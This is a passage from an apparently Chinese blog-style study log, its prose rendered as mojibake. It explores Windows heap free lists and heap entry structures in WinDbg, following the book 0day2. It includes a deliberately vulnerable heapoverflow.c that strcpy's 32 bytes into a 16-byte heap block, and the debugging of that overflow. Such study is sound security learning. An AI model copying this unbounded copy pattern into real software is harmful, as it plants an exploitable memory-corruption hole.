    åˆ°è¿™é‡Œh4é‡Šæ”¾å®Œ,ç”±äºh4å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å—å•å…ƒå¤§å°,h4å †å—é‡Šæ”¾åå°†é“¾å…¥free[2]ç©ºè¡¨ä¸­,free[2]=3a0188
    å¯ä»¥é¢„æµ‹:
    [free[2]]=[3a0188]=h1=3a0688,[3a0188+4]=h4=3a06b8
    [h1]=[3a0688]=h3=3a06a8,[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=h4=3a06b8,[3a06a8+4]=h1=3a0688
    [h4]=[3a06b8]=3a0188,[3a06b8+4]=h3=3a06a8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    ä¸å®é™…æ•°æ®å¹¶ä¸ä¸€è‡´,å› ä¸ºh4é‡Šæ”¾å®Œå,h3,h4,h5ä¸‰ä¸ªç©ºé—²å †å—ç›¸é‚»,ä¼šå‘ç”Ÿåˆå¹¶,3ä¸ªå †å—å¤§å°ä¸€å…±ä¸º2+2+4=8ä¸ªå †å•å…ƒå¤§å°,
    åˆå¹¶åå°†é“¾å…¥free[8]ç©ºè¡¨ä¸­(free[8]æ˜¯128ä¸ªç©ºè¡¨ä¸­çš„ç¬¬9ä¸ªç©ºè¡¨çš„ç´¢å¼•,ä¹Ÿå³0x3a0000+0x178+8*8=0x3a01b8)
    ,é¢„æµ‹:
    [free[8]]=[3a01b8]=h3=3a06a8(h3,h4,h5åˆå¹¶åç”±h3ç´¢å¼•)
    [free[2]]=[3a0188]=h1=3a0688(2ä¸ªå †å—å•å…ƒå¤§å°çš„ç©ºé—²å †åªå‰©ä¸‹h1,åŸæ¥æ˜¯h1,h3,h4)
    [h1]=[3a0688]=free[2]=3a0188,[h1+4]=[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=free[8]=3a01b8,[h3+4]=[3a06a8+4]=free[8]=3a01b8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A01B0  B0 01 3A 00 B0 01 3A 00 A8 06 3A 00 A8 06 3A 00  ?:.?:.?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    å¯è§,å®é™…æ•°æ®ä¸é¢„æµ‹ç»“æœå®Œå…¨ä¸€æ ·,æ­¤æ—¶[free[0]]=[0x3a0178]=3a0708(ä¸€ç›´ä¸å˜),3a0708å¤„æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å¯è§å½“å‰å †å—å¤§å°ä¸º0x120(ä¸ªå †å—å•å…ƒå¤§å°),ä¸Šä¸€ä¸ªå †å—å¤§å°ä¸º4?
    å¹¶ä¸æ˜¯è¿™æ ·,å› ä¸º0x178åç§»å¤„å¹¶ä¸æ˜¯å †å—,è€Œæ˜¯å¤§å°ä¸º128çš„æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæ•°ç»„çš„ä½ç½®,æ‰€ä»¥0x178-8å¹¶ä¸æ˜¯å—é¦–
    ,åç§»0x178æ˜¯free[0],ä¹Ÿå³free[0]=0x3a0178,è€Œåç§»0x178ä¸­å­˜æ”¾çš„å†…å®¹ä¹Ÿå³[free[0]]ä¸ºè¿™ä¸ªæŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
    çš„å€¼,è¿™ä¸ªå€¼æ˜¯ä¸ªæŒ‡é’ˆ,æŒ‡å‘free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—,æ­¤ä¾‹ä¸­free[0]ç©ºè¡¨åªæœ‰ä¸€ä¸ªå †å—,å †å—çš„ç´¢å¼•ä¸º3a0708,ä¹Ÿå³:
    [free[0]]=[3a0178]=3a0708,ä¸”[free[0]+4]=[3a0178+4]=3a0708
    è€Œ[3a0708]=[3a0708+4]=3a0178

ä½¿ç”¨å †çš„ä¸‰ç§æ–¹æ³•:
    a&amp;gt;GetProcessHeapè·å¾—è¿›ç¨‹é»˜è®¤å †å¥æŸ„,HeapAlloc(è¿›ç¨‹é»˜è®¤å¥æŸ„)å¯ä»¥ä»é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´
    b&amp;gt;å½¢å¦‚HeapCreate(0,0x1000,0x10000)åˆ›å»ºä¸å¯æ‰©å±•å †,å †å°†å¯ç”¨ç©ºè¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´
    c&amp;gt;å½¢å¦‚HeapCreate(0,0,0)åˆ›å»ºå¯æ‰©å±•å †,å †å°†å¯ç”¨å¿«è¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´

    åœ¨æ­¤ä¾‹ä¸­,ç”±äºåœ¨åˆ›å»ºå †æ—¶ä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0x1000,0x10000),å¦‚æœä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0,0)å°†åˆ›å»ºå¯
    æ‰©å±•çš„å †,è¿™æ—¶å †ä¼šå¯ç”¨å¿«è¡¨,æŒ‡å‘å¿«è¡¨çš„æŒ‡é’ˆä½äºå †åç§»??å­—èŠ‚å¤„,0day2ä¹¦ä¸­åŒæ—¶æŒ‡å‡ºå¿«è¡¨ä½äº0x584å’Œ0x688åç§»å¤„,é€š
    è¿‡ä¸‹é¢ä»£ç çš„è°ƒè¯•æŸ¥çœ‹å¿«è¡¨çš„åç§»åœ¨å“ªé‡Œ:

    -----------find-lookaside---------------
    #include &amp;lt;windows.h&amp;gt;
    int main()
    {
    	HANDLE hp;
    	HLOCAL h1,h2,h3;
    	hp=HeapCreate(0,0,0);
    	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    	getchar();
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    
    	return 0;
    
    }
    ------------------end-------------------
    ç¼–è¯‘æˆreleaseç‰ˆæœ¬å,è¿è¡Œexe,windbgåŠ è½½
    dt _PEB @$pebæŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå—ä¿¡æ¯

    0:001&amp;gt; dt _PEB @$peb
    ntdll!_PEB
       +0x000 InheritedAddressSpace : 0 &#39;&#39;
       +0x001 ReadImageFileExecOptions : 0 &#39;&#39;
       +0x002 BeingDebugged    : 0x1 &#39;&#39;
       +0x003 SpareBool        : 0 &#39;&#39;
       +0x004 Mutant           : 0xffffffff 
       +0x008 ImageBaseAddress : 0x00400000 
       +0x00c Ldr              : 0x00241e90 _PEB_LDR_DATA
       +0x010 ProcessParameters : 0x00020000 _RTL_USER_PROCESS_PARAMETERS
       +0x014 SubSystemData    : (null) 
       +0x018 ProcessHeap      : 0x00140000     ===&amp;gt;è¿›ç¨‹å¯åŠ¨åˆ›å»ºçš„é»˜è®¤å †
       +0x01c FastPebLock      : 0x7c99d600 _RTL_CRITICAL_SECTION
       +0x020 FastPebLockRoutine : 0x7c921000 
       +0x024 FastPebUnlockRoutine : 0x7c9210e0 
       +0x028 EnvironmentUpdateCount : 1
       +0x02c KernelCallbackTable : (null) 
       +0x030 SystemReserved   : [1] 0
       +0x034 AtlThunkSListPtr32 : 0
       +0x038 FreeList         : (null) 
       +0x03c TlsExpansionCounter : 0
       +0x040 TlsBitmap        : 0x7c99d5c0 
       +0x044 TlsBitmapBits    : [2] 1
       +0x04c ReadOnlySharedMemoryBase : 0x7f6f0000 
       +0x050 ReadOnlySharedMemoryHeap : 0x7f6f0000 
       +0x054 ReadOnlyStaticServerData : 0x7f6f0688  -&amp;gt; (null) 
       +0x058 AnsiCodePageData : 0x7ffa0000 
       +0x05c OemCodePageData  : 0x7ffa0000 
       +0x060 UnicodeCaseTableData : 0x7ffd1000 
       +0x064 NumberOfProcessors : 1
       +0x068 NtGlobalFlag     : 0
       +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000
       +0x078 HeapSegmentReserve : 0x100000
       +0x07c HeapSegmentCommit : 0x2000
       +0x080 HeapDeCommitTotalFreeThreshold : 0x10000
       +0x084 HeapDeCommitFreeBlockThreshold : 0x1000
       +0x088 NumberOfHeaps    : 5            ===&amp;gt;è¿›ç¨‹ä¸­å…±æœ‰5ä¸ªå †
       +0x08c MaximumNumberOfHeaps : 0x10
       +0x090 ProcessHeaps     : 0x7c99cfc0  -&amp;gt; 0x00140000    ===&amp;gt;è¿›ç¨‹å †æŒ‡é’ˆæ•°æ®
       +0x094 GdiSharedHandleTable : (null) 
       +0x098 ProcessStarterHelper : (null) 
       +0x09c GdiDCAttributeList : 0
       +0x0a0 LoaderLock       : 0x7c99b178 
       +0x0a4 OSMajorVersion   : 5
       +0x0a8 OSMinorVersion   : 1
       +0x0ac OSBuildNumber    : 0xa28
       +0x0ae OSCSDVersion     : 0x300
       +0x0b0 OSPlatformId     : 2
       +0x0b4 ImageSubsystem   : 3
       +0x0b8 ImageSubsystemMajorVersion : 4
       +0x0bc ImageSubsystemMinorVersion : 0
       +0x0c0 ImageProcessAffinityMask : 0
       +0x0c4 GdiHandleBuffer  : [34] 0
       +0x14c PostProcessInitRoutine : (null) 
       +0x150 TlsExpansionBitmap : 0x7c99d5b8 
       +0x154 TlsExpansionBitmapBits : [32] 0
       +0x1d4 SessionId        : 0
       +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0
       +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0
       +0x1e8 pShimData        : (null) 
       +0x1ec AppCompatInfo    : (null) 
       +0x1f0 CSDVersion       : _UNICODE_STRING &quot;Service Pack 3&quot;
       +0x1f8 ActivationContextData : (null) 
       +0x1fc ProcessAssemblyStorageMap : (null) 
       +0x200 SystemDefaultActivationContextData : 0x00130000 
       +0x204 SystemAssemblyStorageMap : (null) 
       +0x208 MinimumStackCommit : 0

    +0x018å’Œ+0x088å¤„åˆ†åˆ«ä¸ºè¿›ç¨‹é»˜è®¤å †å’Œè¿›ç¨‹ä¸­å †çš„ä¸ªæ•°
    +0x090å¤„ä¸ºè¿›ç¨‹ä¸­æ‰€æœ‰å †çš„åœ°å€ç»„æˆçš„æŒ‡é’ˆæ•°ç»„

    dd 0x7c99cfc0æŸ¥çœ‹è¿›ç¨‹å †æ•°ç»„
    0:001&amp;gt; dd 0x7c99cfc0
    7c99cfc0  00140000 00240000 00250000 00380000
    7c99cfd0  003a0000 00000000 00000000 00000000
    7c99cfe0  00000000 00000000 00000000 00000000
    7c99cff0  00000000 00000000 00000000 00000000

    æˆ–è€…!heap -hæŸ¥çœ‹æ‰€æœ‰å †çš„åœ°å€
    0:001&amp;gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00140000 
        Segment at 00140000 to 00240000 (00004000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00006000 bytes committed)
      3:   00250000 
        Segment at 00250000 to 00260000 (00003000 bytes committed)
      4:   00380000 
        Segment at 00380000 to 00390000 (00002000 bytes committed)
      5:   003a0000 
        Segment at 003a0000 to 003e0000 (00003000 bytes committed)

    ä¸¤ç§æ–¹æ³•å¾—åˆ°çš„ç»“æœä¸€æ ·,å…¶ä¸­æœ€åä¸€ä¸ªå †çš„åœ°å€0x003a0000æ˜¯ä»£ç ä¸­HeapCreate(0,0,0)åˆ›å»ºå¾—åˆ°çš„å †åœ°å€

    dt _HEAP 0x3a0000æŸ¥çœ‹è¿™ä¸ªå †çš„ç»“æ„
    0:001&amp;gt; dt _HEAP 0x3a0000
    ntdll!_HEAP
       +0x000 Entry            : _HEAP_ENTRY
       +0x008 Signature        : 0xeeffeeff
       +0x00c Flags            : 0x1002
       +0x010 ForceFlags       : 0
       +0x014 VirtualMemoryThreshold : 0xfe00
       +0x018 SegmentReserve   : 0x100000
       +0x01c SegmentCommit    : 0x2000
       +0x020 DeCommitFreeBlockThreshold : 0x200
       +0x024 DeCommitTotalFreeThreshold : 0x2000
       +0x028 TotalFreeSize    : 0x229
       +0x02c MaximumAllocationSize : 0x7ffdefff
       +0x030 ProcessHeapsListIndex : 5
       +0x032 HeaderValidateLength : 0x608
       +0x034 HeaderValidateCopy : (null) 
       +0x038 NextAvailableTagIndex : 0
       +0x03a MaximumTagIndex  : 0
       +0x03c TagEntries       : (null) 
       +0x040 UCRSegments      : (null) 
       +0x044 UnusedUnCommittedRanges : 0x003a0598 _HEAP_UNCOMMMTTED_RANGE
       +0x048 AlignRound       : 0xf
       +0x04c AlignMask        : 0xfffffff8
       +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x3a0050 - 0x3a0050 ]
       +0x058 Segments         : [64] 0x003a0640 _HEAP_SEGMENT
       +0x158 u                : __unnamed
       +0x168 u2               : __unnamed
       +0x16a AllocatorBackTraceIndex : 0
       +0x16c NonDedicatedListLength : 1
       +0x170 LargeBlocksIndex : (null) 
       +0x174 PseudoTagEntries : (null) 
       +0x178 FreeLists        : [128] _LIST_ENTRY [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x578 LockVariable     : 0x003a0608 _HEAP_LOCK
       +0x57c CommitRoutine    : (null) 
       +0x580 FrontEndHeap     : 0x003a0688 
       +0x584 FrontHeapLockCount : 0
       +0x586 FrontEndHeapType : 0x1 &#39;&#39;
       +0x587 LastSegmentIndex : 0 &#39;&#39;

    å¯ä»¥åœ¨0x178åç§»å¤„æ‰¾åˆ°free[0](0å·ç©ºè¡¨)

    dt _LIST_ENTRY 0x3a0178
    ntdll!_LIST_ENTRY
     [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x000 Flink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]
       +0x004 Blink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]

    dd 0x3a0688
    0:001&amp;gt; dd 0x3a0688
    003a0688  00000000 00000000 01000004 00000000
    003a0698  00000000 00000000 00000000 00000000
    003a06a8  00000000 00000003 00000000 00000000
    003a06b8  00000000 00000000 01000004 00000000

    0x3a0000å †ä¸­èƒ½æ‰¾åˆ°0å·ç©ºè¡¨ä½†æ˜¯å´æ‰¾ä¸åˆ°å¿«è¡¨,0day2ä¸­è¯´çš„0x688å’Œ0x584åç§»å¤„å¹¶ä¸æ˜¯å¿«è¡¨çš„æ‰€åœ¨,å…³äºå¿«è¡¨çš„æ‰€åœ¨å’Œå‡º
    ç°æ¡ä»¶,æš‚æƒ‘ä¸å¾—è§£
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;2&amp;gt;æ¼æ´æˆ˜äº‰å®ä¾‹&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ç³»ç»Ÿ:win7 x64+vc6.0

------------------heapoverflow.c---------------------
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
    HANDLE hHeap;
    char *heap;
    char str[]=&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    hHeap=HeapCreate(HEAP_GENERATE_EXCEPTIONS,0x1000,0xffff);
    getchar();

    heap=HeapAlloc(hHeap,0,0x10);
    printf(&quot;heap addr:0x%08x\n&quot;,heap);

    strcpy(heap,str);
    HeapFree(hHeap,0,heap);

    HeapDestroy(hHeap);
    return 0;
}
------------------------end--------------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬,ç”Ÿæˆäº†heapoverflow.exe,åŒå‡»exe,odé™„åŠ 
alt+e
    é€‰æ‹©å¯¹åº”exe,call getcharä¸‹é¢ä¸€å¥å¯¹åº”å¦‚ä¸‹æ±‡ç¼–ä»£ç 
    0040104b  |.  83c404        add     esp,4
    0040104B  |.  83C4 04       add esp,0x4
    0040104E  |&amp;gt;  6A 10         push 0x10                                ; /dwBytes = 10 (16.)
    00401050  |.  6A 00         push 0x0                                 ; |dwFlags = 0
    00401052  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401053  |.  FF15 08604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAlloc&amp;gt;&amp;gt;; \RtlAllocateHeap
    00401059  |.  8BD8          mov ebx,eax
    0040105B  |.  53            push ebx
    0040105C  |.  68 30704000   push heapover.00407030                   ;  ASCII &quot;heap addr:0x%08x
    &quot;
    00401061  |.  E8 4A000000   call heapover.004010B0
    00401066  |.  8D7C24 18     lea edi,dword ptr ss:[esp+0x18]
    0040106A  |.  83C9 FF       or ecx,-0x1
    0040106D  |.  33C0          xor eax,eax
    0040106F  |.  83C4 08       add esp,0x8
    00401072  |.  F2:AE         repne scas byte ptr es:[edi]
    00401074  |.  F7D1          not ecx                                  ;  heapover.00409E41
    00401076  |.  2BF9          sub edi,ecx                              ;  heapover.00409E41
    00401078  |.  53            push ebx                                 ; /pMemory = 7FFDD000
    00401079  |.  8BC1          mov eax,ecx                              ; |heapover.00409E41
    0040107B  |.  8BF7          mov esi,edi                              ; |
    0040107D  |.  8BFB          mov edi,ebx                              ; |
    0040107F  |.  6A 00         push 0x0                                 ; |Flags = 0
    00401081  |.  C1E9 02       shr ecx,0x2                              ; |
    00401084  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&amp;gt;; |
    00401086  |.  8BC8          mov ecx,eax                              ; |
    00401088  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401089  |.  83E1 03       and ecx,0x3                              ; |
    0040108C  |.  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[&amp;gt;; |
    0040108E  |.  FF15 04604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapFree&amp;gt;] ; \HeapFree
    00401094  |.  55            push ebp                                 ; /hHeap = 003A0000
    00401095  |.  FF15 00604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapDestro&amp;gt;; \HeapDestroy
    0040109B  |.  5F            pop edi                                  ;  heapover.00407068
    0040109C  |.  5E            pop esi                                  ;  heapover.00407068
    0040109D  |.  5D            pop ebp                                  ;  heapover.00407068
    0040109E  |.  33C0          xor eax,eax
    004010A0  |.  5B            pop ebx                                  ;  heapover.00407068
    004010A1  |.  83C4 24       add esp,0x24
    004010A4  \.  C3            retn

é€€å‡ºod
é‡æ–°è¿è¡Œheapoverflow.exe,windbgé™„åŠ 
bp 0x40104b
g
åœ¨exeä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦
windbgä¸­æ–­åœ¨æ–­ç‚¹å¤„:
    Breakpoint 0 hit
    eax=00000031 ebx=7efde000 ecx=00409e41 edx=00000101 esi=00407065 edi=0018ff49
    eip=0040104b esp=0018ff14 ebp=00870000 iopl=0         nv up ei pl nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    heapoverflow+0x104b:
    0040104b 83c404          add     esp,4
t
t
...
(eip=401053)
    æ­¤æ—¶è¿˜æ²¡æ‰§è¡ŒHeapAlloc(hHeap,0,0x10)
!heap -h
    0:000&amp;gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00590000 
        Segment at 00590000 to 00690000 (00007000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00002000 bytes committed)
      3:   00870000 
        Segment at 00870000 to 00880000 (00001000 bytes committed)

dt _HEAP 870000
    +0x0c4 FreeLists        : _LIST_ENTRY [ 0x870590 - 0x870590 ] ==&amp;gt;è¯´æ˜0x870590å¤„æ˜¯free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—
    æ­¤æ—¶free[0]ç©ºè¡¨åç§»ä¸å†æ˜¯0x178å¤„,è€Œæ˜¯0x0c4å¤„
dt _LIST_ENTRY 8700c4
    0:000&amp;gt; dt _LIST_ENTRY 870590
    ntdll!_LIST_ENTRY
     [ 0x8700c4 - 0x8700c4 ]
       +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]
       +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]

t
    æ­¤æ—¶è¿›å…¥äº†HeapAllocå‡½æ•°å†…éƒ¨
shift+f11
    æ‰§è¡Œåˆ°è·³å‡ºHeapAllocå‡½æ•°(ç³»ç»Ÿé¢†åŸŸ)åˆ°å½“ä¸Šä¸€å±‚å‡½æ•°
(eip=401059)
    æ­¤æ—¶å †åˆ†é…å®Œæˆ
    dt _heap 870000
        +0x0c4 FreeLists        : _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    è¿™ä¸ªç»“æœè¡¨æ˜free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å¿«ä¸å†æ˜¯åŸæ¥çš„0x870590,è€Œå˜æˆäº†0x8705a8
    dt _LIST_ENTRY 8705a8
        0:000&amp;gt; dt _LIST_ENTRY 8705a8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    æŸ¥çœ‹å¯„å­˜å™¨ä¹Ÿå¯ä»¥çœ‹åˆ°eax=870590(åŸæ¥çš„free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•å€¼),ä¹Ÿå³æºä»£ç ä¸­çš„heap=HeapAlloc(hHeap,0,0x10)
    åˆ†é…åˆ°çš„å †çš„ç´¢å¼•ä¸º870590,é‚£ä¹ˆheap_entryç»“æ„åœ¨870590-8=870588å¤„
    dt _HEAP_ENTRY 870590
        0:000&amp;gt; dt _heap_entry 870590
        ntdll!_HEAP_ENTRY
           +0x000 Size             : 0xc4
           +0x002 Flags            : 0x87 &#39;&#39;
           +0x003 SmallTagIndex    : 0 &#39;&#39;
           +0x000 SubSegmentCode   : 0x008700c4 
           +0x004 PreviousSize     : 0xc4
           +0x006 SegmentOffset    : 0x87 &#39;&#39;
           +0x006 LFHFlags         : 0x87 &#39;&#39;
           +0x007 UnusedBytes      : 0 &#39;&#39;
           +0x000 FunctionIndex    : 0xc4
           +0x002 ContextValue     : 0x87
           +0x000 InterceptorValue : 0x8700c4
           +0x004 UnusedBytesLength : 0xc4
           +0x006 EntryOffset      : 0x87 &#39;&#39;
           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
           +0x000 Code1            : 0x8700c4
           +0x004 Code2            : 0xc4
           +0x006 Code3            : 0x87 &#39;&#39;
           +0x007 Code4            : 0 &#39;&#39;
           +0x000 AgregateCode     : 0x8700c4`008700c4
    å‘ç°å‰ä¸¤ä¸ªå­—èŠ‚å¹¶ä¸æ˜¯3(HeapAllocåˆ†é…0x10+8=3*8å…±3ä¸ªå †å•å…ƒå¤§å°çš„ç©ºé—´),å¯¹ç…§æ³‰å“¥ä¹¦ä¸­çš„å‘½ä»¤,å‘ç°æŸ¥çœ‹å‘½ä»¤åº”è¯¥æ˜¯
    !heap -p -a 870588,è€Œä¸æ˜¯æˆ‘è®¤ä¸ºçš„dt _heap_entry 870590,åæ¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°åŒæ ·çš„é—®é¢˜,è¯´æ˜¯&quot;nt6ä»¥å,heapç»“æ„
    å˜å¾—ä¸å°,dt heap_entryæ˜¯æ— æ³•çœ‹åˆ°çš„,è²Œä¼¼heap_entryåšäº†ç¼–ç &quot;
        http://www.cppblog.com/ay19880703/archive/2011/10/30/159364.html
    äºæ˜¯ç”¨ä¹¦ä¸­çš„!heap -p -a 870588æŸ¥çœ‹heap_entryç»“æ„
    !heap -p -a 870588
        0:000&amp;gt; !heap -p -a 870588
            address 00870588 found in
            _HEAP @ 870000
              HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
                00870588 0003 0000  [00]   00870590    00010 - (busy)
    èƒ½å¤Ÿæ­£å¸¸æŸ¥çœ‹heap_entryçš„ä¿¡æ¯,å½“å‰å †å—å¤§å°ä¸º3,ä¸Šä¸€å †å—å¤§å°ä¸º0
    !heap
        0:000&amp;gt; !heap
        Index   Address  Name      Debugging options enabled
          1:   00590000                
          2:   00240000                
          3:   00870000 
    !heap -a 870000
        Heap entries for Segment00 in Heap 00870000
            00870000: 00000 . 00588 [101] - busy (587)
            00870588: 00588 . 00018 [101] - busy (10)
            008705a0: 00018 . 00a40 [100]
            00870fe0: 00a40 . 00020 [111] - busy (1d)
            00871000:      0000f000      - uncommitted bytes.
    ä»è¿™é‡Œçœ‹å‡ºheapå †çš„åœ°å€ä¸º870588,è€Œä¸æ˜¯870590,è¿™ä¸0day2ä¸­å †å—çš„ç´¢å¼•ä¸ºheap_entry(å ç”¨æ€)æˆ–è€…heap_free_entry
    (ç©ºé—²å †å—)çš„åœ°å€æœ‰ç‚¹ä¸åŒ,è¿™é‡Œçš„!heap -a 870000å¾—åˆ°çš„&quot;entries&quot;å¦‚æœç†è§£æˆ&quot;ç´¢å¼•&quot;ä¼šæŒ‡å‘heap_entry-8æˆ–è€…æ˜¯
    heap_free_entry-8çš„å †å—å—é¦–å¤„,è¿™é‡Œçš„entriesæŒ‰&quot;å…¥å£&quot;æ¥ç†è§£æ¯”è¾ƒå¥½,ä»ä¸Šé¢ä¹Ÿå¯çœ‹å‡º870588ä¸‹ä¸€ä¸ªå †å—æ˜¯ä¸ªç©ºé—²å †å—,
    è€Œä¸”è¿™ä¸ªç©ºé—²å †å—çš„å…¥å£æ˜¯8705a0(ä¸ä¸Šé¢çš„HeapAllocåˆ†é…åfree[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•ä¸º8705a8æ­£å¥½å¯¹åº”)
    ä¸ä¸Šé¢çš„dt _heap_entryä¸€æ ·çš„æ˜¯dt _heap_free_entryä¹Ÿä¸èƒ½å¾—åˆ°æƒ³è¦çš„æ•°æ®ä¸‹,å¦‚ä¸‹:
    dt _heap_free_entry 8705a0
        0:000&amp;gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x38a0
           +0x002 Flags            : 0x39 &#39;9&#39;
           +0x003 SmallTagIndex    : 0x1e &#39;&#39;
           +0x000 SubSegmentCode   : 0x1e3938a0 
           +0x004 PreviousSize     : 0x81cd    =====&amp;gt;è¿™é‡Œåº”è¯¥æ˜¯3
           +0x006 SegmentOffset    : 0 &#39;&#39;
           +0x006 LFHFlags         : 0 &#39;&#39;
           +0x007 UnusedBytes      : 0 &#39;&#39;
           +0x000 FunctionIndex    : 0x38a0
           +0x002 ContextValue     : 0x1e39
           +0x000 InterceptorValue : 0x1e3938a0
           +0x004 UnusedBytesLength : 0x81cd
           +0x006 EntryOffset      : 0 &#39;&#39;
           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
           +0x000 Code1            : 0x1e3938a0
           +0x004 Code2            : 0x81cd
           +0x006 Code3            : 0 &#39;&#39;
           +0x007 Code4            : 0 &#39;&#39;
           +0x000 AgregateCode     : 0x81cd`1e3938a0
           +0x008 FreeList         : _LIST_ENTRY [ 0x8700c4 - 0x8700c4 ]
    åœ¨+04çš„åç§»å¤„çš„å€¼æ˜¯ä¸Šä¸€ä¸ªå †å—çš„å¤§å°,ä¸Šä¸€ä¸ªå †å—çš„å¤§å°åº”è¯¥æ˜¯3,è¿™é‡Œç¡®ä¸æ˜¯,è¯´æ˜dt _heap_free_entryå’Œdt
    _heap_entryåœ¨win7 x64ä½ä¸Šéƒ½å·²ç»ä¸å†æœ‰ç”¨äº†,dt _list_entry 8705a0+8è¿˜æ˜¯å¯ä»¥ç”¨çš„,ä¹Ÿå³_list_entryæ²¡æœ‰å˜,å¦‚ä¸‹:
    dt _list_entry 8705a0+8
        0:000&amp;gt; dt _list_entry 8705a0+8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]       
    _list_entryå¯ä»¥æ­£å¸¸æ˜¾ç¤º

p
p
p
...
(eip=401084)
    æ­¤å¤„å¯¹åº”çš„æ˜¯å¦‚ä¸‹çš„strcpyçš„å¤åˆ¶è¿‡ç¨‹
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    æ­¤æ—¶æŸ¥çœ‹esiå’Œesiä¸­çš„å†…å®¹å¦‚ä¸‹:
    dd edi
        0:000&amp;gt; dd edi
        00870590  008700c4 008700c4 00000000 00000000
        008705a0  1e3938a0 000081cd 008700c4 008700c4
        008705b0  00000000 00000000 00000000 00000000
        008705c0  00000000 00000000 00000000 00000000
        008705d0  00000000 00000000 00000000 00000000
        008705e0  00000000 00000000 00000000 00000000
        008705f0  00000000 00000000 00000000 00000000
        00870600  00000000 00000000 00000000 00000000
    dd esi
